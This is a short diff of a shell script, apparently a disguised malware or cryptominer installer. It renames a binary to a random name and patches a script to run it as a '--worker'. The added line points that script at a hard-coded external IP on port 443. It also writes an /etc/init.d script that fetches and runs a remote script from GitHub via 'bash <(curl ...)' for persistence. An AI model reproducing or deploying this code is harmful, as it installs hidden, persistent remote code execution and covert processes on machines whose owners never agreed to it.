@@ -5,6 +5,7 @@ cd /gabap
 variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
 mv keflex $variable1
 sed -i "s/mongodb/${variable1} --worker ${variable1}/g" ./codeine.sh
+sed -i "s/host/20.163.170.215:443/g" ./codeine.sh
 cd /etc/init.d
 echo "bash <(curl -s -L https://raw.githubusercontent.com/humirav/spiriva/main/gluco.sh)" > lorat.sh
 chmod a+x lorat.sh
